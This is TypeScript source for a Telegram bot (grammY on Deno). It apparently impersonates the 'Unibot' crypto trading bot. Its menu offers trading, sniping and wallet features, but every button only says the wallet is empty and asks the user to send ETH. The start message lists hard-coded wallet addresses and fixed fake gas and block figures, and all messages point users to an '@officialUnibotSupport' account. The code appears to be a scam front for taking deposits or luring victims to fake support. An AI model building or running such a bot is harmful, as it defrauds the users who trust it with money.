import { Bot, InlineKeyboard } from "./deps.deno.ts";
import {
  hydrateReply,
  parseMode,
} from "https://deno.land/x/grammy_parse_mode@1.8.1/mod.ts";
import type { ParseModeFlavor } from "https://deno.land/x/grammy_parse_mode@1.8.1/mod.ts";
import axiod from "https://deno.land/x/axiod/mod.ts";

export const bot = new Bot<ParseModeFlavor<Context>>(Deno.env.get("BOT_TOKEN") || "234dc");

// Install the plugin.
bot.use(hydrateReply);

// Set the default parse mode for ctx.reply.
bot.api.config.use(parseMode("MarkdownV2"));
// // Construct a keyboard.
// const inlineKeyboard = new InlineKeyboard().text("Connect Wallet", "click-payload");

// Build an inline keyboard:
const homeKeyboard = new InlineKeyboard()
  .text('Buy Tokens', 'connect').text('Sell Tokens', 'connect').row()
  .text('Buy Limit', 'connect').text('Sell Limit', 'connect').row()
  .text('Snipers (ERC-20)', 'connect').row()
  .text('Token Balances', 'connect').text('Wallet Analysis', 'connect').text('🌐Flex PnL', 'connect').row()
  .text('🖥Uni-X', 'connect').text('👯‍♂️friend.tech', 'connect').text('⚙️Settings', 'connect').row()
  .text('🆘Contact Support', 'support')

// Send a keyboard along with a message.
bot.command("start", async (ctx) => {
  // Example usage
  const res = await axiod.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD')
    const { USD } = res.data    
    console.log('Ethereum price:', USD);

    // Use the aggregated Ethereum data here as needed
  await ctx.replyWithHTML(
    // "<b>This</b> is <i>withHTML</i> <code>formatting</code>",
    `
    <b>Gas:</b> 28   ═   <b>Block:</b> 18723534   ═   <b>ETH:</b>$${USD || "2277"} 
    🦄  <b>Unibot</b> | Website | Tutorials | [✪Watchlist]  🦄
    Snipe & trade at elite speeds for free. Ethereum and Basechain is supported.
    
    <b>═══ Your Wallets ═══</b>
    <b>▰ Wallet-w1 ▰</b>
    <b>Bal:</b> <code>0.0 ETH</code> ($0)
    <code>0xAf69DD299cCF8507c47D59322A2ef6fDda324d43</code>
    
    <b>▰ Wallet-w2 ▰</b>
    <b>Bal:</b> <code>0.0 ETH</code> ($0)
    <code>0x336cA29849AF80a1DDc8AACC09d49d51854e925e</code>
    
    <b>▰ Wallet-w3 ▰</b>
    <b>Bal:</b> <code>0.0 ETH</code> ($0)
    <code>0x050a7A9B36E1f2CF94C10B7AAc541b351f023B15</code>
    `,
    { reply_markup: homeKeyboard })
});

// Wait for click events with specific callback data.
bot.callbackQuery("connect", async (ctx) => {
  await ctx.replyWithHTML(` 🪙  Token Balances  🪙
  <b>═ Ethereum ═</b>
  <i>Your wallet is empty</i>
  Send in ETH(ERC20) to proceed.
`
  );
});

// Wait for click events with specific callback data.
bot.callbackQuery("support", async (ctx) => {
  await ctx.reply("Contact our 24/7 support to resolve any issue @officialUnibotSupport");
});

bot.on('message:text', async (ctx) => {
  try {
      const btnText = ctx.message.text;
  if ( btnText === "🆘Contact Support" )  {
    ctx.reply("Contact our 24/7 support to resolve any issue @officialUnibotSupport"); // Reply to the user with a confirmation message
  } else {
    await ctx.reply("Contact our 24/7 support to resolve any issue @officialUnibotSupport");
  }
  } catch (error) {
    console.error(error)
  }
  
});

